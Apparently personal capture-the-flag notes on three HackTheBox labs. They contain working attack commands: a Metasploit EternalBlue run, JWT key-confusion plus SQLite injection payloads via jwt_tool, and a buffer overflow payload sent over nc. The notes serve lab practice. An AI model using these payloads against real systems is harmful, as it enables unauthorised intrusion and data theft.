*************************BLUE**********************************************************
SMB, ms17-010,windows

nmap
sudo nmap --script=smb-vuln* 10.10.10.40
msfconsole
search ms17-010  --> use exploit/windows/smb/ms17_010_eternalblue
set RHOST, set LHOST to point your machine
drugi nacin bez metasploita
https://github.com/3ndG4me/AutoBlue-MS17-010
https://medium.com/@barpoet/hackthebox-blue-walkthrough-645f84c7af6e

------------------------------Under Contruction-----------------------------------------------------------------------
UnderConstruction  - sqlite db, jwt, sql injection
Motasem Hamdan - yt


JWTHelper.js --> attack jsonwebtoken (vulnerable) - instead off RS256 HS256
	-A tool that can modify JWT (jwt_tool.py) - https://github.com/ticarpi/jwt_tool
	-SQLite 3 knowledge to SQL injection
keep token from Burp in file token
keep public key from jwt.io (with editing /n) in public_key.pem	
leave token and publickey.pem in the same folder as tool

./jwt_tool.py $(cat token) -I -pc username -pv "test6" -X k -pk publickey.pem (posle ovoga uzimamo jwt token i stavljamo u repeater)
./jwt_tool.py $(cat token) -I -pc username -pv "test6 ' and 1=0 union all select 1,1,1--" -X k -pk publickey.pem   --> broj kolona
./jwt_tool.py $(cat token) -I -pc username -pv "test6 ' and 1=0 union all select 1,sqlite_version(),1--" -X k -pk publickey.pem  
./jwt_tool.py $(cat token) -I -pc username -pv "test6 ' and 1=0 union all select 1,group_concat(tbl_name),1 from sqlite_master--" -X k -pk publickey.pem    --> flag_storage,sqlite_sequence,users
./jwt_tool.py $(cat token) -I -pc username -pv "test6 ' and 1=0 union all select 1,group_concat(sql),1 from sqlite_master--" -X k -pk publickey.pem   ->table flag_storage
./jwt_tool.py $(cat token) -I -pc username -pv "test6 ' and 1=0 union all select 1,group_concat(top_secret_flaag),1 from flag_storage--" -X k -pk publickey.pem 
dont expose your public key
----------------------------------------------------------------------------------------------------------
You know 0xDiablos - buffer overflow, ghidra, reverse engineering
Motasem Hamdan yt


sha256sum file --> file vuln
sudo apt install ghidra --> open vuln in ghidra ---search main
check in ghidra main,flag functions - previously auto analyze
command line - ./vuln --> python3 -c "print(A*181 - ili stavimo 200,185)" | ./vuln
gdb:
sudo apt install gdb 
gdb -q vuln   --- tool for debugging program --> patter_create 200 bof.txt - ovo bi trebalo da bude u fajlu /Desktop
r < bof.txt   --> check EIP , next lets try to find offset
patter_offset vrednost EIP = 0x342342... trebalo bi 188 da bude
disas flag --> check value where is starting
python3 -c "import sys; sys.stdout.buffer.write(b'A'*188+b'\xe2\x91\x04\x08'+b'test\xef\xbe\xad\xde\x0d\xd0\xde\xc0')" > payload.txt

(b'A'*188+     = patter_offset prethodno sto smo nasli
b'\xe2\x91\x04\x08'   = disas flag from gdb samo naopacke 0x080491e2
+b'test\xef\xbe\xad\xde\x0d\xde\xc0')  = parametar 1 and parameter 2 from flag function from Ghidra

cat payload.txt
cat payload.txt | ./vuln
cat payload.txt | nc 206.189.125.80 30497
------------------------------------------

 


	
